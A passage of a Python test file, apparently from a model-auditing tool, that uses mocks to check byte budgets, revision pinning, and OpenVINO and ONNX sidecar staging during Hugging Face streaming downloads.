                    "shape": [len(tensor_data)],
                    "data_offsets": [0, len(tensor_data)],
                }
            },
            tensor_data,
        )
        runtime_max_size = _HF_CONTENT_SNIFF_BYTES + 8
        dry_run_minimum = len(frame) + runtime_max_size
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: len(frame)}, _HF_TEST_REVISION),
        )

        def header_scan(*_args: object, **_kwargs: object) -> Any:
            result = _fake_remote_safetensors_scan(filename, len(frame))
            result.bytes_scanned = 8
            result.metadata["remote_bytes_transferred"] = 8
            return result

        with (
            patch("requests.get", side_effect=_fake_range_responder(frame)) as mock_requests_get,
            patch("huggingface_hub.hf_hub_download") as mock_download,
            patch(
                "modelaudit.utils.sources.huggingface._scan_remote_huggingface_safetensors_header",
                side_effect=header_scan,
            ) as mock_header_scan,
        ):
            with pytest.raises(ValueError, match=f"require at least {dry_run_minimum} bytes"):
                plan_huggingface_streaming_download(
                    "hf://test/model",
                    max_size=runtime_max_size,
                    scannable_extensions={".safetensors"},
                    scannable_scanner_ids={"pickle", "safetensors"},
                    allow_content_probes=False,
                    _stream_safetensors_headers=True,
                )

            results = list(
                download_model_streaming(
                    f"hf://test/model?revision={_HF_TEST_REVISION}",
                    max_size=runtime_max_size,
                    scannable_extensions={".safetensors"},
                    scannable_scanner_ids={"pickle", "safetensors"},
                    _include_scan_results=True,
                )
            )

        _path, _is_last, scan_result, _accounting = _unpack_internal_stream_item(results[0])
        assert scan_result.metadata["remote_header_only"] is True
        assert mock_requests_get.call_count == 1
        assert mock_header_scan.call_args.kwargs["max_transferred_bytes"] == 8
        mock_download.assert_not_called()

    @pytest.mark.parametrize(
        ("budget_adjustment", "expected_success"),
        [(0, True), (-1, False)],
        ids=["exact-budget", "one-byte-under"],
    )
    def test_content_routed_safetensors_probe_shares_header_budget(
        self,
        budget_adjustment: int,
        expected_success: bool,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Renamed-file probes and native header reads consume one max-size budget."""
        filename = "renamed.bin"
        tensor_data = bytes(_HF_CONTENT_SNIFF_BYTES)
        frame, header_len = _make_safetensors_frame(
            {
                "tensor": {
                    "dtype": "U8",
                    "shape": [len(tensor_data)],
                    "data_offsets": [0, len(tensor_data)],
                }
            },
            tensor_data,
        )
        max_size = _HF_CONTENT_SNIFF_BYTES + 16 + header_len + budget_adjustment
        transferred_ranges: list[int] = []
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: len(frame)}, _HF_TEST_REVISION),
        )

        def range_response(url: str, *, headers: dict[str, str], **_kwargs: object) -> _FakeRangeResponse:
            start_text, end_text = headers["Range"].removeprefix("bytes=").split("-", 1)
            start, end = int(start_text), min(int(end_text), len(frame) - 1)
            payload = frame[start : end + 1]
            transferred_ranges.append(len(payload))
            return _strict_range_response(payload, len(frame), start_offset=start, url=url)

        with (
            patch("requests.get", side_effect=range_response),
            patch("huggingface_hub.hf_hub_download") as mock_download,
        ):
            results = list(
                download_model_streaming(
                    f"hf://test/model?revision={_HF_TEST_REVISION}",
                    max_size=max_size,
                    scannable_extensions={".safetensors"},
                    scannable_scanner_ids={"safetensors"},
                    _include_scan_results=True,
                )
            )

        _path, _is_last, scan_result, accounting = cast(
            tuple[Path, bool, Any, StreamedSourceByteAccounting], results[0]
        )
        assert accounting == StreamedSourceByteAccounting(pretransferred_bytes=_HF_CONTENT_SNIFF_BYTES)
        assert scan_result.success is expected_success
        if expected_success:
            assert sum(transferred_ranges) == max_size
        else:
            assert "remote_safetensors_header_max_size_exceeded" in scan_result.metadata["scan_outcome_reasons"]
            assert sum(transferred_ranges) <= max_size
        mock_download.assert_not_called()

    def test_content_probe_and_header_bytes_are_aggregated_before_early_limit(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A renamed SafeTensors probe and its precomputed header result are both retained."""
        filename = "renamed.bin"
        tensor_data = bytes(_HF_CONTENT_SNIFF_BYTES)
        frame, header_len = _make_safetensors_frame(
            {
                "a": {
                    "dtype": "U8",
                    "shape": [len(tensor_data)],
                    "data_offsets": [0, len(tensor_data)],
                }
            },
            tensor_data,
        )
        header_bytes = 16 + header_len
        expected_bytes = _HF_CONTENT_SNIFF_BYTES + header_bytes
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: len(frame)}, _HF_TEST_REVISION),
        )

        def range_response(url: str, *, headers: dict[str, str], **_kwargs: object) -> _FakeRangeResponse:
            start_text, end_text = headers["Range"].removeprefix("bytes=").split("-", 1)
            start, end = int(start_text), min(int(end_text), len(frame) - 1)
            return _strict_range_response(
                frame[start : end + 1],
                len(frame),
                start_offset=start,
                url=url,
            )

        with (
            patch("requests.get", side_effect=range_response),
            patch("huggingface_hub.hf_hub_download") as mock_download,
        ):
            streamed_results = list(
                download_model_streaming(
                    f"hf://test/model?revision={_HF_TEST_REVISION}",
                    max_size=expected_bytes,
                    scannable_extensions={".safetensors"},
                    scannable_scanner_ids={"safetensors"},
                    _include_scan_results=True,
                )
            )

        streamed = cast(tuple[Path, bool, Any, StreamedSourceByteAccounting], streamed_results[0])
        assert streamed[2].bytes_scanned == header_bytes
        assert streamed[3] == StreamedSourceByteAccounting(pretransferred_bytes=_HF_CONTENT_SNIFF_BYTES)

        exact = scan_model_streaming(
            iter(streamed_results),
            timeout=30,
            delete_after_scan=False,
            cache_enabled=False,
            scanners=["safetensors"],
            max_total_size=expected_bytes,
        )
        bounded = scan_model_streaming(
            iter(streamed_results),
            timeout=30,
            delete_after_scan=False,
            cache_enabled=False,
            scanners=["safetensors"],
            max_total_size=_HF_CONTENT_SNIFF_BYTES - 1,
        )

        assert exact.bytes_scanned == expected_bytes
        assert exact.files_scanned == 1
        assert exact.success is True
        assert bounded.bytes_scanned == expected_bytes
        assert bounded.files_scanned == 1
        assert any(issue.details.get("max_total_size") == _HF_CONTENT_SNIFF_BYTES - 1 for issue in bounded.issues)
        mock_download.assert_not_called()

    def test_streaming_plan_shares_selection_probe_budget_with_openvino_companions(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Renamed-file selection and companion discovery cannot reset the probe cap."""
        seen_budgets: list[_HuggingFaceProbeBudget] = []
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: (
                ["model.xml", "model.bin", "renamed.payload"],
                _HF_TEST_REVISION,
                None,
            ),
        )

        def detect_route(
            repo_id: str,
            filename: str,
            _revision: str,
            budget: _HuggingFaceProbeBudget,
        ) -> str:
            seen_budgets.append(budget)
            transfer_size = 8 if filename == "renamed.payload" else 1
            budget.reserve(repo_id, transfer_size)
            budget.transferred_bytes += transfer_size
            return "openvino"

        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
            detect_route,
        )

        with pytest.raises(ValueError, match="inspection byte limit exceeded"):
            plan_huggingface_streaming_download(
                "hf://test/model",
                max_size=8,
                scannable_extensions={".xml"},
                scannable_scanner_ids={"openvino"},
            )

        assert len(seen_budgets) == 2
        assert seen_budgets[0] is seen_budgets[1]
        assert seen_budgets[0].transferred_bytes == 8

    @patch("modelaudit.utils.sources.huggingface._run_huggingface_download_with_deadline")
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    def test_download_model_streaming_bounds_each_transfer(
        self,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        mock_run_download: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Each streaming transfer should receive the shared acquisition deadline."""
        downloaded_file = tmp_path / "pytorch_model.bin"
        downloaded_file.write_bytes(b"weights")
        mock_run_download.return_value = str(downloaded_file)

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                timeout_seconds=30,
            )
        )

        assert results == [(downloaded_file, True)]
        operation, kwargs, deadline, repo_id = mock_run_download.call_args.args
        assert operation == "hf_hub_download"
        assert kwargs["filename"] == "pytorch_model.bin"
        assert deadline > time.monotonic()
        assert repo_id == "test/model"

    @patch("modelaudit.utils.sources.huggingface._run_huggingface_download_with_deadline")
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    def test_download_model_streaming_passes_requested_revision_to_listing(
        self,
        mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        mock_run_download: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Pinned streaming scans must list the requested immutable revision, not repository default."""
        downloaded_file = tmp_path / "pytorch_model.bin"
        downloaded_file.write_bytes(b"weights")
        mock_run_download.return_value = str(downloaded_file)

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                timeout_seconds=30,
            )
        )

        assert results == [(downloaded_file, True)]
        assert mock_list_repo_files.call_args.kwargs["revision"] == _HF_TEST_REVISION

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={"", ".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "README.md"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_downloads_scannable_files_only(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Streaming downloads should only request recognized scannable files."""
        downloaded_file = tmp_path / "huggingface" / "test" / "model" / "pytorch_model.bin"
        mock_hf_hub_download.return_value = str(downloaded_file)

        results = list(download_model_streaming("https://huggingface.co/test/model", cache_dir=tmp_path))

        assert results == [(downloaded_file, True)]
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="pytorch_model.bin",
            revision=_HF_TEST_REVISION,
            cache_dir=str(tmp_path / "huggingface"),
            local_dir=str(tmp_path / "huggingface" / "test" / "model"),
        )

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format")
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            ["openvino/openvino_model.bin", "openvino/openvino_model.xml", "README.md"],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_prefetches_openvino_bin_companion(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """OpenVINO-only streaming must stage the exact .bin sidecar before yielding XML."""

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / "huggingface" / "test" / "model" / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            if filename.endswith(".xml"):
                path.write_text("<net version='10'></net>", encoding="utf-8")
            else:
                path.write_bytes(b"weights")
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect
        mock_detect_content.side_effect = lambda _repo_id, filename, _revision, _budget: (
            "openvino" if filename.endswith(".xml") else None
        )

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                cache_dir=tmp_path,
                scannable_extensions={".xml"},
                scannable_scanner_ids={"openvino"},
            )
        )

        yielded_xml = tmp_path / "huggingface" / "test" / "model" / "openvino" / "openvino_model.xml"
        assert results == [(yielded_xml, True)]
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "openvino/openvino_model.xml",
            "openvino/openvino_model.bin",
        ]
        assert call("test/model", "openvino/openvino_model.xml", _HF_TEST_REVISION, ANY) in (
            mock_detect_content.call_args_list
        )
        assert call("test/model", "openvino/openvino_model.bin", _HF_TEST_REVISION, ANY) not in (
            mock_detect_content.call_args_list
        )

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format")
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            [
                "models/encoder/openvino_model.bin",
                "models/encoder/openvino_model.xml",
                "models/decoder/openvino_model.bin",
                "models/decoder/openvino_model.xml",
                "variants/\u00dcnicode-Model.bin",
                "variants/\u00dcnicode-Model.xml",
                "orphan/openvino_model.bin",
            ],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_prefetches_path_sensitive_openvino_companions(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Duplicate basenames must stage only each XML's exact same-directory weights."""

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / "huggingface" / "test" / "model" / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            if filename.endswith(".xml"):
                path.write_text("<net version='10'></net>", encoding="utf-8")
            else:
                path.write_bytes(filename.encode("utf-8"))
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect
        mock_detect_content.side_effect = lambda _repo_id, filename, _revision, _budget: (
            "openvino" if filename.endswith(".xml") else None
        )

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                cache_dir=tmp_path,
                scannable_extensions={".xml"},
                scannable_scanner_ids={"openvino"},
            )
        )

        download_root = tmp_path / "huggingface" / "test" / "model"
        assert results == [
            (download_root / "models" / "encoder" / "openvino_model.xml", False),
            (download_root / "models" / "decoder" / "openvino_model.xml", False),
            (download_root / "variants" / "\u00dcnicode-Model.xml", True),
        ]
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "models/encoder/openvino_model.xml",
            "models/encoder/openvino_model.bin",
            "models/decoder/openvino_model.xml",
            "models/decoder/openvino_model.bin",
            "variants/\u00dcnicode-Model.xml",
            "variants/\u00dcnicode-Model.bin",
        ]
        assert "orphan/openvino_model.bin" not in {
            call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list
        }

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format")
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            [
                "openvino/openvino_model.bin",
                "openvino/openvino_model.xml",
                "openvino/openvino_model_qint8_quantized.bin",
                "openvino/openvino_model_qint8_quantized.xml",
            ],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_prefetches_multiple_openvino_bin_companions(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Pinned OpenVINO repositories can stage every exact XML/BIN pair before scanning."""

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / "huggingface" / "test" / "model" / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            if filename.endswith(".xml"):
                path.write_text("<net version='10'></net>", encoding="utf-8")
            else:
                path.write_bytes(b"weights")
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect
        mock_detect_content.side_effect = lambda _repo_id, filename, _revision, _budget: (
            "openvino" if filename.endswith(".xml") else None
        )

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                cache_dir=tmp_path,
                scannable_extensions={".xml"},
                scannable_scanner_ids={"openvino"},
            )
        )

        download_root = tmp_path / "huggingface" / "test" / "model" / "openvino"
        assert results == [
            (download_root / "openvino_model.xml", False),
            (download_root / "openvino_model_qint8_quantized.xml", True),
        ]
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "openvino/openvino_model.xml",
            "openvino/openvino_model.bin",
            "openvino/openvino_model_qint8_quantized.xml",
            "openvino/openvino_model_qint8_quantized.bin",
        ]
        assert all(call.args[1].endswith(".xml") for call in mock_detect_content.call_args_list)

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format")
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            [
                "a/OpenVINO_Mod\u00e8le.BIN",
                "a/OpenVINO_Mod\u00e8le.XML",
                "b/OpenVINO_Mod\u00e8le.BIN",
                "b/OpenVINO_Mod\u00e8le.XML",
            ],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_prefetches_case_variant_duplicate_openvino_companions(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """HF OpenVINO companion staging should keep duplicate basenames path-specific."""

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / "huggingface" / "test" / "model" / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            if filename.endswith(".XML"):
                path.write_text("<net version='10'></net>", encoding="utf-8")
            else:
                path.write_bytes(b"weights")
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect
        mock_detect_content.side_effect = lambda _repo_id, filename, _revision, _budget: (
            "openvino" if filename.endswith(".XML") else None
        )

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                cache_dir=tmp_path,
                scannable_extensions={".xml"},
                scannable_scanner_ids={"openvino"},
            )
        )

        download_root = tmp_path / "huggingface" / "test" / "model"
        assert results == [
            (download_root / "a" / "OpenVINO_Mod\u00e8le.XML", False),
            (download_root / "b" / "OpenVINO_Mod\u00e8le.XML", True),
        ]
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "a/OpenVINO_Mod\u00e8le.XML",
            "a/OpenVINO_Mod\u00e8le.BIN",
            "b/OpenVINO_Mod\u00e8le.XML",
            "b/OpenVINO_Mod\u00e8le.BIN",
        ]
        assert all(call.args[1].endswith(".XML") for call in mock_detect_content.call_args_list)

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format")
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            ["openvino/openvino_model.bin", "openvino/openvino_model.xml", "README.md"],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_manifest_selection_does_not_prefetch_openvino_bin_companion(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Non-OpenVINO XML scans must not stage unrelated same-stem OpenVINO weights."""

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / "huggingface" / "test" / "model" / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text("<net version='10'></net>", encoding="utf-8")
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect
        mock_detect_content.side_effect = lambda _repo_id, filename, _revision, _budget: (
            "openvino" if filename.endswith(".xml") else None
        )

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                cache_dir=tmp_path,
                scannable_extensions={".xml"},
                scannable_scanner_ids={"manifest"},
            )
        )

        yielded_xml = tmp_path / "huggingface" / "test" / "model" / "openvino" / "openvino_model.xml"
        assert results == [(yielded_xml, True)]
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "openvino/openvino_model.xml"
        ]
        mock_detect_content.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format")
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["openvino/model.xml", "openvino/model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_yields_openvino_bin_when_openvino_not_selected(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Selected .bin files must not be consumed as OpenVINO companions when OpenVINO is excluded."""

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / "huggingface" / "test" / "model" / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            if filename.endswith(".xml"):
                path.write_text("<net version='10'></net>", encoding="utf-8")
            else:
                path.write_bytes(b"pickle-or-pytorch-candidate")
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                cache_dir=tmp_path,
                scannable_extensions={".xml", ".bin"},
                scannable_scanner_ids={"pickle"},
            )
        )

        download_root = tmp_path / "huggingface" / "test" / "model" / "openvino"
        assert results == [(download_root / "model.xml", False), (download_root / "model.bin", True)]
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "openvino/model.xml",
            "openvino/model.bin",
        ]
        mock_detect_content.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format")
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["document.xml", "document.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_yields_non_openvino_near_match_bin(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A non-OpenVINO XML must not hide a same-stem .bin from standalone scanning."""

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            if filename.endswith(".xml"):
                path.write_text("<project><model name='not-openvino'/></project>", encoding="utf-8")
            else:
                path.write_bytes(b"binary")
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect
        _mock_detect_content.side_effect = lambda _repo_id, filename, _revision, _budget: (
            "openvino" if filename.endswith(".xml") else None
        )

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions={".xml"},
                scannable_scanner_ids={"openvino"},
            )
        )

        assert results == [(tmp_path / "document.xml", False), (tmp_path / "document.bin", True)]
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "document.xml",
            "document.bin",
        ]

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".onnx"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["onnx/model.onnx", "onnx/model.onnx_data", "README.md"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_preserves_onnx_external_data_before_parent_yield(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Referenced ONNX sidecars should be present while the parent ONNX is yielded."""
        payload = _make_external_onnx_payload(tmp_path)
        sidecar_bytes = struct.pack("f", 1.0)

        def download_side_effect(*, filename: str, local_dir: str | None = None, **_kwargs: object) -> str:
            assert local_dir is not None
            path = Path(local_dir) / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(payload if filename == "onnx/model.onnx" else sidecar_bytes)
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect
        mock_get_paths_info.side_effect = [
            [SimpleNamespace(path="onnx/model.onnx", size=len(payload))],
            [SimpleNamespace(path="onnx/model.onnx_data", size=len(sidecar_bytes))],
        ]

        generator = download_model_streaming(
            "https://huggingface.co/test/model",
            cache_dir=tmp_path / "modelaudit_hf_fixture",
            max_size=len(payload) + len(sidecar_bytes),
            scannable_extensions={".onnx"},
            scannable_scanner_ids={"onnx"},
        )
        model_path, is_last = next(generator)
        sidecar_path = model_path.with_name("model.onnx_data")

        assert is_last is True
        assert model_path.name == "model.onnx"
        assert sidecar_path.read_bytes() == sidecar_bytes
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "onnx/model.onnx",
            "onnx/model.onnx_data",
        ]
        assert mock_get_paths_info.call_args_list == [
            call("test/model", ["onnx/model.onnx"], revision=_HF_TEST_REVISION),
            call("test/model", ["onnx/model.onnx_data"], revision=_HF_TEST_REVISION),
        ]

        with pytest.raises(StopIteration):
            next(generator)
        assert not sidecar_path.exists()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".onnx"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            ["onnx/a.onnx", "onnx/b.onnx", "onnx/shared.onnx_data"],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_counts_shared_onnx_external_data_once(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A shared context-only ONNX sidecar should be downloaded and budgeted once."""
        payload = _make_external_onnx_payload(tmp_path, external_path="shared.onnx_data")
        sidecar_bytes = struct.pack("f", 1.0)

        def download_side_effect(*, filename: str, local_dir: str | None = None, **_kwargs: object) -> str:
            assert local_dir is not None
            path = Path(local_dir) / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(sidecar_bytes if filename == "onnx/shared.onnx_data" else payload)
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect
        mock_get_paths_info.side_effect = [
            [
                SimpleNamespace(path="onnx/a.onnx", size=len(payload)),
                SimpleNamespace(path="onnx/b.onnx", size=len(payload)),
            ],
            [SimpleNamespace(path="onnx/shared.onnx_data", size=len(sidecar_bytes))],
        ]

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                cache_dir=tmp_path / "modelaudit_hf_fixture",
                max_size=(len(payload) * 2) + len(sidecar_bytes),
                scannable_extensions={".onnx"},
                scannable_scanner_ids={"onnx"},
            )
        )

        assert [path.name for path, _is_last in results] == ["a.onnx", "b.onnx"]
        assert [is_last for _path, is_last in results] == [False, True]
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "onnx/a.onnx",
            "onnx/shared.onnx_data",
            "onnx/b.onnx",
        ]
        assert mock_get_paths_info.call_args_list == [
            call("test/model", ["onnx/a.onnx", "onnx/b.onnx"], revision=_HF_TEST_REVISION),
            call("test/model", ["onnx/shared.onnx_data"], revision=_HF_TEST_REVISION),
        ]
        assert not (tmp_path / "modelaudit_hf_fixture" / "test" / "model" / "onnx" / "shared.onnx_data").exists()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format")
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".onnx"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["onnx/renamed", "onnx/model.onnx_data"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_preserves_content_routed_renamed_onnx_external_data(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Content-routed renamed ONNX files should receive declared sidecars."""
        payload = _make_external_onnx_payload(tmp_path)
        sidecar_bytes = struct.pack("f", 1.0)

        def detect_side_effect(_repo_id: str, filename: str, _revision: str, _budget: object) -> str | None:
            return "onnx" if filename == "onnx/renamed" else None

        def download_side_effect(*, filename: str, local_dir: str | None = None, **_kwargs: object) -> str:
            assert local_dir is not None
            path = Path(local_dir) / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(payload if filename == "onnx/renamed" else sidecar_bytes)
            return str(path)

        mock_detect_content.side_effect = detect_side_effect
        mock_hf_hub_download.side_effect = download_side_effect

        generator = download_model_streaming(
            "https://huggingface.co/test/model",
            cache_dir=tmp_path / "cache",
            scannable_extensions={".onnx"},
            scannable_scanner_ids={"onnx"},
        )
        model_path, is_last = next(generator)
        sidecar_path = model_path.parent / "model.onnx_data"

        assert is_last is True
        assert model_path.name == "renamed"
        assert sidecar_path.read_bytes() == sidecar_bytes
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "onnx/renamed",
            "onnx/model.onnx_data",
        ]
        assert [call.args[1] for call in mock_detect_content.call_args_list] == [
            "onnx/renamed",
            "onnx/model.onnx_data",
        ]

        with pytest.raises(StopIteration):
            next(generator)

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["onnx/model", "onnx/model.onnx_data"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
